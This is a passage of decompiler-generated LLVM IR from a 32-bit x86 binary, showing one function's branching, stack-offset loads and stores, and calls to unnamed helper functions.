  %v1_8050af3 = add i32 %v0_8050930.lcssa, 368
  %v2_8050af3 = inttoptr i32 %v1_8050af3 to i32*
  %v3_8050af3 = load i32, i32* %v2_8050af3, align 4
  %v5_8050af3 = add i32 %v0_8050930.lcssa, -32
  %v6_8050af3 = inttoptr i32 %v5_8050af3 to i32*
  store i32 %v3_8050af3, i32* %v6_8050af3, align 4
  %v0_8050afa = call i32 @function_8054008()
  store i32 %v0_8050afa, i32* %eax.global-to-local, align 4
  %v0_8050aff = load i32, i32* @esp, align 4
  %v1_8050aff = add i32 %v0_8050aff, 32
  %v2_8050b02 = icmp slt i32 %v0_8050afa, 0
  br i1 %v2_8050b02, label %dec_label_pc_8050da3, label %dec_label_pc_8050b0a

dec_label_pc_8050b0a:                             ; preds = %dec_label_pc_8050ae1
  %v1_8050b0a = inttoptr i32 %v1_8050aff to i32*
  %v2_8050b0a = load i32, i32* %v1_8050b0a, align 4
  %v4_8050b0a = add i32 %v2_8050b0a, %v0_8050afa
  store i32 %v4_8050b0a, i32* %v1_8050b0a, align 4
  %v0_8050d90.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050d90

dec_label_pc_8050b12:                             ; preds = %dec_label_pc_8050ac8
  %tmp95 = or i32 %v3_8050930, 1
  %tmp96 = icmp eq i32 %tmp95, 17
  br i1 %tmp96, label %dec_label_pc_8050b1b, label %dec_label_pc_8050bae

dec_label_pc_8050b1b:                             ; preds = %dec_label_pc_8050b12
  %v9_8050b12 = icmp eq i32 %v3_8050930, 17
  %v1_8050b1b = add i32 %v0_8050930.lcssa, 332
  %v2_8050b1b = inttoptr i32 %v1_8050b1b to i32*
  store i32 0, i32* %v2_8050b1b, align 4
  %v0_8050b26 = load i32, i32* @esp, align 4
  %v1_8050b26 = add i32 %v0_8050b26, 344
  %v2_8050b26 = inttoptr i32 %v1_8050b26 to i32*
  %v3_8050b26 = load i32, i32* %v2_8050b26, align 4
  store i32 %v3_8050b26, i32* %edx.global-to-local, align 4
  %v1_8050b2d = icmp eq i1 %v9_8050b12, false
  br i1 %v1_8050b2d, label %dec_label_pc_8050b79, label %dec_label_pc_8050b2f

dec_label_pc_8050b2f:                             ; preds = %dec_label_pc_8050b1b
  %v1_8050b2f = inttoptr i32 %v3_8050b26 to i32*
  %v2_8050b2f = load i32, i32* %v1_8050b2f, align 4
  store i32 %v2_8050b2f, i32* %eax.global-to-local, align 4
  %v2_8050b31 = add i32 %v0_8050b26, 340
  %v3_8050b31 = inttoptr i32 %v2_8050b31 to i32*
  store i32 %v2_8050b2f, i32* %v3_8050b31, align 4
  %v0_8050b38 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b38 = icmp eq i32 %v0_8050b38, 0
  br i1 %v1_8050b38, label %dec_label_pc_8050c2c, label %dec_label_pc_8050b40

dec_label_pc_8050b40:                             ; preds = %dec_label_pc_8050b2f
  %v0_8050b40 = load i32, i32* @esp, align 4
  %v1_8050b40 = add i32 %v0_8050b40, 20
  %v2_8050b40 = inttoptr i32 %v1_8050b40 to i32*
  %v3_8050b40 = load i32, i32* %v2_8050b40, align 4
  store i32 %v3_8050b40, i32* %eax.global-to-local, align 4
  %v2_8050b47 = icmp slt i32 %v3_8050b40, 0
  br i1 %v2_8050b47, label %dec_label_pc_8050b4d, label %dec_label_pc_8050b4b

dec_label_pc_8050b4b:                             ; preds = %dec_label_pc_8050b40
  br label %dec_label_pc_8050b4d

dec_label_pc_8050b4d:                             ; preds = %dec_label_pc_8050b40, %dec_label_pc_8050b4b
  %storemerge100 = phi i32 [ %v3_8050b40, %dec_label_pc_8050b4b ], [ -1, %dec_label_pc_8050b40 ]
  store i32 %storemerge100, i32* %ecx.global-to-local, align 4
  %v1_8050b4d = add i32 %v0_8050b40, 340
  store i32 %v1_8050b4d, i32* %edx.global-to-local, align 4
  %v1_8050b54 = add i32 %v0_8050b40, 332
  store i32 %v1_8050b54, i32* %eax.global-to-local, align 4
  %v2_8050b5b = add i32 %v0_8050b40, -4
  %v3_8050b5b = inttoptr i32 %v2_8050b5b to i32*
  store i32 %v1_8050b54, i32* %v3_8050b5b, align 4
  %v0_8050b5c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050b5c = add i32 %v0_8050b40, -8
  %v3_8050b5c = inttoptr i32 %v2_8050b5c to i32*
  store i32 %v0_8050b5c, i32* %v3_8050b5c, align 4
  %v0_8050b5d = load i32, i32* %edx.global-to-local, align 4
  %v2_8050b5d = add i32 %v0_8050b40, -12
  %v3_8050b5d = inttoptr i32 %v2_8050b5d to i32*
  store i32 %v0_8050b5d, i32* %v3_8050b5d, align 4
  %v0_8050b5e = load i32, i32* %edx.global-to-local, align 4
  %v2_8050b5e = add i32 %v0_8050b40, -16
  %v3_8050b5e = inttoptr i32 %v2_8050b5e to i32*
  store i32 %v0_8050b5e, i32* %v3_8050b5e, align 4
  %v0_8050b5f = call i32 @function_8053bc4()
  store i32 %v0_8050b5f, i32* %eax.global-to-local, align 4
  %v0_8050b64 = load i32, i32* @esp, align 4
  %v1_8050b64 = add i32 %v0_8050b64, 16
  store i32 %v0_8050b5f, i32* @esi, align 4
  %v10_8050b69 = icmp eq i32 %v0_8050b5f, -1
  br i1 %v10_8050b69, label %dec_label_pc_8050da3, label %dec_label_pc_8050b72

dec_label_pc_8050b72:                             ; preds = %dec_label_pc_8050b4d
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8050c36

dec_label_pc_8050b79:                             ; preds = %dec_label_pc_8050b1b
  %v0_8050b79 = load i32, i32* @ebx, align 4
  %v2_8050b79 = add i32 %v0_8050b26, -4
  %v3_8050b79 = inttoptr i32 %v2_8050b79 to i32*
  store i32 %v0_8050b79, i32* %v3_8050b79, align 4
  %v1_8050b7a = add i32 %v0_8050b26, 332
  store i32 %v1_8050b7a, i32* %eax.global-to-local, align 4
  %v2_8050b81 = add i32 %v0_8050b26, -8
  %v3_8050b81 = inttoptr i32 %v2_8050b81 to i32*
  store i32 %v1_8050b7a, i32* %v3_8050b81, align 4
  %v0_8050b82 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050b82 = inttoptr i32 %v0_8050b82 to i32*
  %v2_8050b82 = load i32, i32* %v1_8050b82, align 4
  %v4_8050b82 = add i32 %v0_8050b26, -12
  %v5_8050b82 = inttoptr i32 %v4_8050b82 to i32*
  store i32 %v2_8050b82, i32* %v5_8050b82, align 4
  %v1_8050b84 = add i32 %v0_8050b26, 204
  store i32 %v1_8050b84, i32* @ebx, align 4
  %v2_8050b8b = add i32 %v0_8050b26, -16
  %v3_8050b8b = inttoptr i32 %v2_8050b8b to i32*
  store i32 %v1_8050b84, i32* %v3_8050b8b, align 4
  %v0_8050b8c = call i32 @function_8053b80()
  store i32 %v0_8050b8c, i32* %eax.global-to-local, align 4
  %v0_8050b91 = load i32, i32* @esp, align 4
  %v1_8050b91 = add i32 %v0_8050b91, 16
  store i32 %v0_8050b8c, i32* @esi, align 4
  %v10_8050b96 = icmp eq i32 %v0_8050b8c, -1
  br i1 %v10_8050b96, label %dec_label_pc_8050da3, label %dec_label_pc_8050b9f

dec_label_pc_8050b9f:                             ; preds = %dec_label_pc_8050b79
  %v0_8050b9f = load i32, i32* @ebx, align 4
  store i32 %v0_8050b9f, i32* @edi, align 4
  %v2_8050ba1 = add i32 %v0_8050b8c, 220
  %v3_8050ba1 = add i32 %v2_8050ba1, %v0_8050b91
  %v4_8050ba1 = inttoptr i32 %v3_8050ba1 to i8*
  store i8 0, i8* %v4_8050ba1, align 1
  br label %dec_label_pc_8050c36

dec_label_pc_8050bae:                             ; preds = %dec_label_pc_8050b12
  %tmp97 = icmp ult i32 %v3_8050930, 20
  br i1 %tmp97, label %dec_label_pc_8050bb3, label %dec_label_pc_8050bfe

dec_label_pc_8050bb3:                             ; preds = %dec_label_pc_8050bae
  %v9_8050bae = icmp eq i32 %v3_8050930, 19
  %v1_8050bb3 = add i32 %v0_8050930.lcssa, 344
  %v2_8050bb3 = inttoptr i32 %v1_8050bb3 to i32*
  %v3_8050bb3 = load i32, i32* %v2_8050bb3, align 4
  store i32 %v3_8050bb3, i32* %edx.global-to-local, align 4
  %v1_8050bba = icmp eq i1 %v9_8050bae, false
  %v1_8050bdf = inttoptr i32 %v3_8050bb3 to i32*
  %v2_8050bdf = load i32, i32* %v1_8050bdf, align 4
  br i1 %v1_8050bba, label %dec_label_pc_8050bdf, label %dec_label_pc_8050bbc

dec_label_pc_8050bbc:                             ; preds = %dec_label_pc_8050bb3
  store i32 %v2_8050bdf, i32* @edi, align 4
  %v1_8050bbe = icmp eq i32 %v2_8050bdf, 0
  br i1 %v1_8050bbe, label %dec_label_pc_8050c2c, label %dec_label_pc_8050bc2

dec_label_pc_8050bc2:                             ; preds = %dec_label_pc_8050bbc, %dec_label_pc_8050c07
  %v1_8050bcf = phi i32 [ %v0_8050930.lcssa, %dec_label_pc_8050bbc ], [ %v1_8050c21, %dec_label_pc_8050c07 ]
  %v1_8050bc2 = add i32 %v1_8050bcf, 20
  %v2_8050bc2 = inttoptr i32 %v1_8050bc2 to i32*
  %v3_8050bc2 = load i32, i32* %v2_8050bc2, align 4
  store i32 %v3_8050bc2, i32* %eax.global-to-local, align 4
  %v2_8050bc9 = icmp slt i32 %v3_8050bc2, 0
  br i1 %v2_8050bc9, label %dec_label_pc_8050bcf, label %dec_label_pc_8050bcd

dec_label_pc_8050bcd:                             ; preds = %dec_label_pc_8050bc2
  br label %dec_label_pc_8050bcf

dec_label_pc_8050bcf:                             ; preds = %dec_label_pc_8050bc2, %dec_label_pc_8050bcd
  %storemerge = phi i32 [ %v3_8050bc2, %dec_label_pc_8050bcd ], [ -1, %dec_label_pc_8050bc2 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_8050bcf = add i32 %v1_8050bcf, -4
  %v3_8050bcf = inttoptr i32 %v2_8050bcf to i32*
  store i32 %v3_8050930, i32* %v3_8050bcf, align 4
  %v2_8050bd0 = add i32 %v1_8050bcf, -8
  %v3_8050bd0 = inttoptr i32 %v2_8050bd0 to i32*
  store i32 %v3_8050930, i32* %v3_8050bd0, align 4
  %v0_8050bd1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050bd1 = add i32 %v1_8050bcf, -12
  %v3_8050bd1 = inttoptr i32 %v2_8050bd1 to i32*
  store i32 %v0_8050bd1, i32* %v3_8050bd1, align 4
  %v0_8050bd2 = load i32, i32* @edi, align 4
  %v2_8050bd2 = add i32 %v1_8050bcf, -16
  %v3_8050bd2 = inttoptr i32 %v2_8050bd2 to i32*
  store i32 %v0_8050bd2, i32* %v3_8050bd2, align 4
  %v0_8050bd3 = call i32 @function_80514ec()
  store i32 %v0_8050bd3, i32* %eax.global-to-local, align 4
  store i32 %v0_8050bd3, i32* @esi, align 4
  br label %dec_label_pc_8050c36

dec_label_pc_8050bdf:                             ; preds = %dec_label_pc_8050bb3
  store i32 %v2_8050bdf, i32* %eax.global-to-local, align 4
  %v1_8050be1 = add i32 %v0_8050930.lcssa, 204
  store i32 %v1_8050be1, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_8050bed = trunc i32 %v2_8050bdf to i8
  %v4_8050bed = inttoptr i32 %v1_8050be1 to i8*
  store i8 %v1_8050bed, i8* %v4_8050bed, align 1
  %v0_8050bf4 = load i32, i32* @esp, align 4
  %v1_8050bf4 = add i32 %v0_8050bf4, 205
  %v2_8050bf4 = inttoptr i32 %v1_8050bf4 to i8*
  store i8 0, i8* %v2_8050bf4, align 1
  br label %dec_label_pc_8050c36

dec_label_pc_8050bfe:                             ; preds = %dec_label_pc_8050bae
  %v9_8050bfe = icmp eq i32 %v3_8050930, 20
  %v1_8050c01 = icmp eq i1 %v9_8050bfe, false
  br i1 %v1_8050c01, label %dec_label_pc_8050da3, label %dec_label_pc_8050c07

dec_label_pc_8050c07:                             ; preds = %dec_label_pc_8050bfe
  %v0_8050c07 = load i32, i32* %stack_var_-364, align 4
  %v1_8050c07 = call i32 @function_8050568(i32 %v0_8050c07)
  store i32 %v1_8050c07, i32* %eax.global-to-local, align 4
  %v0_8050c0c = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c0c = load i32, i32* @esp, align 4
  %v2_8050c0c = add i32 %v1_8050c0c, -4
  %v3_8050c0c = inttoptr i32 %v2_8050c0c to i32*
  store i32 %v0_8050c0c, i32* %v3_8050c0c, align 4
  %v1_8050c0d = add i32 %v1_8050c0c, -8
  %v2_8050c0d = inttoptr i32 %v1_8050c0d to i32*
  store i32 128, i32* %v2_8050c0d, align 4
  %v1_8050c12 = add i32 %v1_8050c0c, 204
  store i32 %v1_8050c12, i32* %edx.global-to-local, align 4
  %v2_8050c19 = add i32 %v1_8050c0c, -12
  %v3_8050c19 = inttoptr i32 %v2_8050c19 to i32*
  store i32 %v1_8050c12, i32* %v3_8050c19, align 4
  %v1_8050c1a = inttoptr i32 %v1_8050c07 to i32*
  %v2_8050c1a = load i32, i32* %v1_8050c1a, align 4
  %v4_8050c1a = add i32 %v1_8050c0c, -16
  %v5_8050c1a = inttoptr i32 %v4_8050c1a to i32*
  store i32 %v2_8050c1a, i32* %v5_8050c1a, align 4
  %v0_8050c1c = call i32 @function_80515d0()
  store i32 %v0_8050c1c, i32* %eax.global-to-local, align 4
  %v0_8050c21 = load i32, i32* @esp, align 4
  %v1_8050c21 = add i32 %v0_8050c21, 16
  store i32 %v0_8050c1c, i32* @edi, align 4
  br label %dec_label_pc_8050bc2

dec_label_pc_8050c28:                             ; preds = %dec_label_pc_8050ab7, %dec_label_pc_8050ab0, %dec_label_pc_8050a9d
  %v0_8050c4235 = phi i32 [ %v1_8050a43, %dec_label_pc_8050ab7 ], [ 0, %dec_label_pc_8050ab0 ], [ 5, %dec_label_pc_8050a9d ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050c42

dec_label_pc_8050c2c:                             ; preds = %dec_label_pc_8050bbc, %dec_label_pc_8050b2f
  store i32 ptrtoint ([7 x i8]* @global_var_805b5de.311 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_8050c36

dec_label_pc_8050c36:                             ; preds = %dec_label_pc_8050bdf, %dec_label_pc_8050bcf, %dec_label_pc_8050b9f, %dec_label_pc_8050b72, %dec_label_pc_8050c2c
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_8050c3d = load i32, i32* @esp, align 4
  %v1_8050c3d = add i32 %v0_8050c3d, 7
  %v2_8050c3d = inttoptr i32 %v1_8050c3d to i8*
  store i8 32, i8* %v2_8050c3d, align 1
  %v0_8050c42.pre = load i32, i32* @esi, align 4
  %v1_8050c42.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050c42

dec_label_pc_8050c42:                             ; preds = %dec_label_pc_8050c28, %dec_label_pc_8050abf, %dec_label_pc_8050c36
  %v1_8050c42 = phi i32 [ 0, %dec_label_pc_8050c28 ], [ %v2_8050ab7, %dec_label_pc_8050abf ], [ %v1_8050c42.pre, %dec_label_pc_8050c36 ]
  %v0_8050c42 = phi i32 [ %v0_8050c4235, %dec_label_pc_8050c28 ], [ %v1_8050a43, %dec_label_pc_8050abf ], [ %v0_8050c42.pre, %dec_label_pc_8050c36 ]
  %v2_8050c42 = add i32 %v0_8050c42, %v1_8050c42
  store i32 %v2_8050c42, i32* @edx, align 4
  %v0_8050c45 = load i32, i32* @ebp, align 4
  %v9_8050c45 = icmp eq i32 %v0_8050c45, 11
  br i1 %v9_8050c45, label %dec_label_pc_8050c56, label %dec_label_pc_8050c4a

dec_label_pc_8050c4a:                             ; preds = %dec_label_pc_8050c42
  %v1_8050c4c = add i32 %v0_8050c45, -5
  %v6_8050c4c = sub i32 4, %v0_8050c45
  %v7_8050c4c = and i32 %v6_8050c4c, %v0_8050c45
  %v8_8050c4c = icmp slt i32 %v7_8050c4c, 0
  %v9_8050c4c = icmp eq i32 %v1_8050c4c, 0
  %v10_8050c4c = icmp slt i32 %v1_8050c4c, 0
  %v3_8050c4f = icmp eq i1 %v10_8050c4c, %v8_8050c4c
  %v4_8050c4f = icmp eq i1 %v9_8050c4c, false
  %v5_8050c4f = and i1 %v4_8050c4f, %v3_8050c4f
  %v6_8050c4f = zext i1 %v5_8050c4f to i32
  store i32 %v6_8050c4f, i32* %eax.global-to-local, align 4
  %v2_8050c52 = add i32 %v2_8050c42, 1
  %v3_8050c52 = add i32 %v2_8050c52, %v6_8050c4f
  store i32 %v3_8050c52, i32* @edx, align 4
  br label %dec_label_pc_8050c56

dec_label_pc_8050c56:                             ; preds = %dec_label_pc_8050c42, %dec_label_pc_8050c4a
  %v0_8050c56 = load i32, i32* @esp, align 4
  %v1_8050c56 = add i32 %v0_8050c56, 24
  %v2_8050c56 = inttoptr i32 %v1_8050c56 to i32*
  %v3_8050c56 = load i32, i32* %v2_8050c56, align 4
  store i32 %v3_8050c56, i32* %eax.global-to-local, align 4
  %v1_8050c5a = add i32 %v0_8050c56, 8
  %v2_8050c5a = inttoptr i32 %v1_8050c5a to i32*
  store i32 0, i32* %v2_8050c5a, align 4
  %v0_8050c62 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c62 = load i32, i32* @edx, align 4
  %v2_8050c62 = sub i32 %v0_8050c62, %v1_8050c62
  %v7_8050c62 = icmp ult i32 %v0_8050c62, %v1_8050c62
  %v12_8050c62 = icmp eq i32 %v2_8050c62, 0
  %v2_8050c64 = or i1 %v7_8050c62, %v12_8050c62
  br i1 %v2_8050c64, label %dec_label_pc_8050c6c, label %dec_label_pc_8050c66

dec_label_pc_8050c66:                             ; preds = %dec_label_pc_8050c56
  store i32 %v2_8050c62, i32* %eax.global-to-local, align 4
  %v1_8050c68 = load i32, i32* @esp, align 4
  %v2_8050c68 = add i32 %v1_8050c68, 8
  %v3_8050c68 = inttoptr i32 %v2_8050c68 to i32*
  store i32 %v2_8050c62, i32* %v3_8050c68, align 4
  %v0_8050c70.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050c6c

dec_label_pc_8050c6c:                             ; preds = %dec_label_pc_8050c56, %dec_label_pc_8050c66
  %v0_8050c70 = phi i32 [ %v1_8050c62, %dec_label_pc_8050c56 ], [ %v0_8050c70.pre, %dec_label_pc_8050c66 ]
  %v0_8050c6c = load i32, i32* @esp, align 4
  %v1_8050c6c = add i32 %v0_8050c6c, 8
  %v2_8050c6c = inttoptr i32 %v1_8050c6c to i32*
  %v3_8050c6c = load i32, i32* %v2_8050c6c, align 4
  store i32 %v3_8050c6c, i32* %ecx.global-to-local, align 4
  %v2_8050c70 = add i32 %v3_8050c6c, %v0_8050c70
  store i32 %v2_8050c70, i32* %eax.global-to-local, align 4
  %v1_8050c73 = inttoptr i32 %v0_8050c6c to i32*
  %v2_8050c73 = load i32, i32* %v1_8050c73, align 4
  %v4_8050c73 = add i32 %v2_8050c73, %v2_8050c70
  store i32 %v4_8050c73, i32* %v1_8050c73, align 4
  %v0_8050c76 = load i32, i32* @esp, align 4
  %v1_8050c76 = add i32 %v0_8050c76, 7
  %v2_8050c76 = inttoptr i32 %v1_8050c76 to i8*
  %v3_8050c76 = load i8, i8* %v2_8050c76, align 1
  %v9_8050c76 = icmp eq i8 %v3_8050c76, 48
  %v1_8050c7b = icmp eq i1 %v9_8050c76, false
  br i1 %v1_8050c7b, label %dec_label_pc_8050c87, label %dec_label_pc_8050c7d

dec_label_pc_8050c7d:                             ; preds = %dec_label_pc_8050c6c
  %v0_8050c7d = load i32, i32* @ebx, align 4
  %v1_8050c7d = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050c7d = add i32 %v1_8050c7d, %v0_8050c7d
  store i32 %v2_8050c7d, i32* @ebx, align 4
  %v1_8050c7f = add i32 %v0_8050c76, 8
  %v2_8050c7f = inttoptr i32 %v1_8050c7f to i32*
  store i32 0, i32* %v2_8050c7f, align 4
  %v0_8050c87.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050c87

dec_label_pc_8050c87:                             ; preds = %dec_label_pc_8050c6c, %dec_label_pc_8050c7d
  %v0_8050c8e = phi i32 [ %v0_8050c76, %dec_label_pc_8050c6c ], [ %v0_8050c87.pre, %dec_label_pc_8050c7d ]
  %v1_8050c87 = add i32 %v0_8050c8e, 32
  %v2_8050c87 = inttoptr i32 %v1_8050c87 to i8*
  %v3_8050c87 = load i8, i8* %v2_8050c87, align 1
  %v4_8050c87 = and i8 %v3_8050c87, 8
  %v5_8050c87 = icmp eq i8 %v4_8050c87, 0
  %v1_8050c8c = icmp eq i1 %v5_8050c87, false
  br i1 %v1_8050c8c, label %dec_label_pc_8050cb5, label %dec_label_pc_8050c8e

dec_label_pc_8050c8e:                             ; preds = %dec_label_pc_8050c87
  %v1_8050c8e = add i32 %v0_8050c8e, 8
  %v2_8050c8e = inttoptr i32 %v1_8050c8e to i32*
  %v3_8050c8e = load i32, i32* %v2_8050c8e, align 4
  store i32 %v3_8050c8e, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8050c97 = add i32 %v0_8050c8e, 368
  %v2_8050c97 = inttoptr i32 %v1_8050c97 to i32*
  %v3_8050c97 = load i32, i32* %v2_8050c97, align 4
  store i32 %v3_8050c97, i32* @eax, align 4
  %v0_8050c9e = call i32 @function_8050770()
  store i32 %v0_8050c9e, i32* %eax.global-to-local, align 4
  %v1_8050ca3 = load i32, i32* @esp, align 4
  %v2_8050ca3 = add i32 %v1_8050ca3, 8
  %v3_8050ca3 = inttoptr i32 %v2_8050ca3 to i32*
  %v4_8050ca3 = load i32, i32* %v3_8050ca3, align 4
  %v15_8050ca3 = icmp eq i32 %v0_8050c9e, %v4_8050ca3
  %v1_8050ca7 = icmp eq i1 %v15_8050ca3, false
  br i1 %v1_8050ca7, label %dec_label_pc_8050da3, label %dec_label_pc_8050cad

dec_label_pc_8050cad:                             ; preds = %dec_label_pc_8050c8e
  store i32 0, i32* %v3_8050ca3, align 4
  %v1_8050cb5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050cb5

dec_label_pc_8050cb5:                             ; preds = %dec_label_pc_8050c87, %dec_label_pc_8050cad
  %v1_8050cb5 = phi i32 [ %v0_8050c8e, %dec_label_pc_8050c87 ], [ %v1_8050cb5.pre, %dec_label_pc_8050cad ]
  %v0_8050cb5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050cb5 = add i32 %v1_8050cb5, -4
  %v3_8050cb5 = inttoptr i32 %v2_8050cb5 to i32*
  store i32 %v0_8050cb5, i32* %v3_8050cb5, align 4
  %v0_8050cb6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050cb6 = add i32 %v1_8050cb5, -8
  %v3_8050cb6 = inttoptr i32 %v2_8050cb6 to i32*
  store i32 %v0_8050cb6, i32* %v3_8050cb6, align 4
  %v1_8050cb7 = add i32 %v1_8050cb5, 368
  %v2_8050cb7 = inttoptr i32 %v1_8050cb7 to i32*
  %v3_8050cb7 = load i32, i32* %v2_8050cb7, align 4
  %v5_8050cb7 = add i32 %v1_8050cb5, -12
  %v6_8050cb7 = inttoptr i32 %v5_8050cb7 to i32*
  store i32 %v3_8050cb7, i32* %v6_8050cb7, align 4
  %v0_8050cbe = load i32, i32* @ebp, align 4
  %v1_8050cbe = add i32 %v0_8050cbe, ptrtoint (i32* @global_var_805b5e5.312 to i32)
  store i32 %v1_8050cbe, i32* %eax.global-to-local, align 4
  %v2_8050cc4 = add i32 %v1_8050cb5, -16
  %v3_8050cc4 = inttoptr i32 %v2_8050cc4 to i32*
  store i32 %v1_8050cbe, i32* %v3_8050cc4, align 4
  %v0_8050cc5 = call i32 @function_805136c()
  store i32 %v0_8050cc5, i32* %eax.global-to-local, align 4
  %v0_8050cca = load i32, i32* @esp, align 4
  %v1_8050cca = add i32 %v0_8050cca, 384
  %v2_8050cca = inttoptr i32 %v1_8050cca to i32*
  %v3_8050cca = load i32, i32* %v2_8050cca, align 4
  store i32 %v3_8050cca, i32* @eax, align 4
  %v0_8050cd1 = load i32, i32* @ebx, align 4
  store i32 %v0_8050cd1, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8050cd8 = call i32 @function_8050770()
  store i32 %v0_8050cd8, i32* %eax.global-to-local, align 4
  %v0_8050cdd = load i32, i32* @esp, align 4
  %v1_8050cdd = add i32 %v0_8050cdd, 16
  %v1_8050ce0 = load i32, i32* @ebx, align 4
  %v12_8050ce0 = icmp eq i32 %v0_8050cd8, %v1_8050ce0
  %v1_8050ce2 = icmp eq i1 %v12_8050ce0, false
  br i1 %v1_8050ce2, label %dec_label_pc_8050da3, label %dec_label_pc_8050ce8

dec_label_pc_8050ce8:                             ; preds = %dec_label_pc_8050cb5
  %v1_8050ce8 = add i32 %v0_8050cdd, 356
  %v2_8050ce8 = inttoptr i32 %v1_8050ce8 to i32*
  %v3_8050ce8 = load i32, i32* %v2_8050ce8, align 4
  %v4_8050ce8 = icmp eq i32 %v3_8050ce8, 0
  %v1_8050cf0 = icmp eq i1 %v4_8050ce8, false
  br i1 %v1_8050cf0, label %dec_label_pc_8050d14, label %dec_label_pc_8050cf2

dec_label_pc_8050cf2:                             ; preds = %dec_label_pc_8050ce8
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050cf4 = load i32, i32* @esi, align 4
  %v1_8050cf4 = icmp eq i32 %v0_8050cf4, 0
  br i1 %v1_8050cf4, label %dec_label_pc_8050d0a.thread, label %dec_label_pc_8050d0a

dec_label_pc_8050d0a.thread:                      ; preds = %dec_label_pc_8050cf2
  br label %dec_label_pc_8050d75

dec_label_pc_8050d0a:                             ; preds = %dec_label_pc_8050cf2
  %v2_8050cf8 = add i32 %v0_8050cdd, 12
  %v3_8050cf8 = inttoptr i32 %v2_8050cf8 to i32*
  store i32 0, i32* %v3_8050cf8, align 4
  %v1_8050cf9 = add i32 %v0_8050cdd, 384
  %v2_8050cf9 = inttoptr i32 %v1_8050cf9 to i32*
  %v3_8050cf9 = load i32, i32* %v2_8050cf9, align 4
  %v5_8050cf9 = add i32 %v0_8050cdd, 8
  %v6_8050cf9 = inttoptr i32 %v5_8050cf9 to i32*
  store i32 %v3_8050cf9, i32* %v6_8050cf9, align 4
  %v0_8050d00 = load i32, i32* @esi, align 4
  %v2_8050d00 = add i32 %v0_8050cdd, 4
  %v3_8050d00 = inttoptr i32 %v2_8050d00 to i32*
  store i32 %v0_8050d00, i32* %v3_8050d00, align 4
  %v0_8050d01 = load i32, i32* @edi, align 4
  %v3_8050d01 = inttoptr i32 %v0_8050cdd to i32*
  store i32 %v0_8050d01, i32* %v3_8050d01, align 4
  %v0_8050d02 = load i32, i32* %stack_var_-364, align 4
  %v4_8050d02 = call i32 @function_8053d0c(i32 %v0_8050d02, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050d02, i32* %eax.global-to-local, align 4
  %v0_8050d07 = load i32, i32* @esp, align 4
  %v1_8050d07 = add i32 %v0_8050d07, 16
  %v1_8050d0a.pre = load i32, i32* @esi, align 4
  %v12_8050d0a = icmp eq i32 %v4_8050d02, %v1_8050d0a.pre
  %v1_8050d0c = icmp eq i1 %v12_8050d0a, false
  br i1 %v1_8050d0c, label %dec_label_pc_8050da3, label %dec_label_pc_8050d75

dec_label_pc_8050d14:                             ; preds = %dec_label_pc_8050ce8
  %v1_8050d14 = add i32 %v0_8050cdd, 348
  %v2_8050d14 = inttoptr i32 %v1_8050d14 to i32*
  store i32 0, i32* %v2_8050d14, align 4
  %v0_8050d716 = load i32, i32* @esi, align 4
  %v1_8050d717 = icmp eq i32 %v0_8050d716, 0
  %v1_8050d7314 = icmp eq i1 %v1_8050d717, false
  br i1 %v1_8050d7314, label %dec_label_pc_8050d21, label %dec_label_pc_8050d14.dec_label_pc_8050d75.loopexit_crit_edge

dec_label_pc_8050d14.dec_label_pc_8050d75.loopexit_crit_edge: ; preds = %dec_label_pc_8050d14
  %v0_8050d75.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050d75

dec_label_pc_8050d21:                             ; preds = %dec_label_pc_8050d14, %dec_label_pc_8050d6f
  %v0_8050d21 = phi i32 [ %v2_8050d6f, %dec_label_pc_8050d6f ], [ %v0_8050d716, %dec_label_pc_8050d14 ]
  %tmp98 = icmp ult i32 %v0_8050d21, 129
  br i1 %tmp98, label %dec_label_pc_8050d30, label %dec_label_pc_8050d2b

dec_label_pc_8050d2b:                             ; preds = %dec_label_pc_8050d21
  br label %dec_label_pc_8050d30

dec_label_pc_8050d30:                             ; preds = %dec_label_pc_8050d21, %dec_label_pc_8050d2b
  %storemerge99 = phi i32 [ 128, %dec_label_pc_8050d2b ], [ %v0_8050d21, %dec_label_pc_8050d21 ]
  store i32 %storemerge99, i32* %edx.global-to-local, align 4
  %v0_8050d30 = load i32, i32* @esp, align 4
  %v1_8050d30 = add i32 %v0_8050d30, 332
  %v2_8050d37 = add i32 %v0_8050d30, -4
  %v3_8050d37 = inttoptr i32 %v2_8050d37 to i32*
  store i32 %v1_8050d30, i32* %v3_8050d37, align 4
  %v0_8050d38 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050d38 = add i32 %v0_8050d30, -8
  %v3_8050d38 = inttoptr i32 %v2_8050d38 to i32*
  store i32 %v0_8050d38, i32* %v3_8050d38, align 4
  %v1_8050d39 = add i32 %v0_8050d30, 340
  store i32 %v1_8050d39, i32* %eax.global-to-local, align 4
  %v2_8050d40 = add i32 %v0_8050d30, -12
  %v3_8050d40 = inttoptr i32 %v2_8050d40 to i32*
  store i32 %v1_8050d39, i32* %v3_8050d40, align 4
  %v1_8050d41 = add i32 %v0_8050d30, 204
  store i32 %v1_8050d41, i32* @edi, align 4
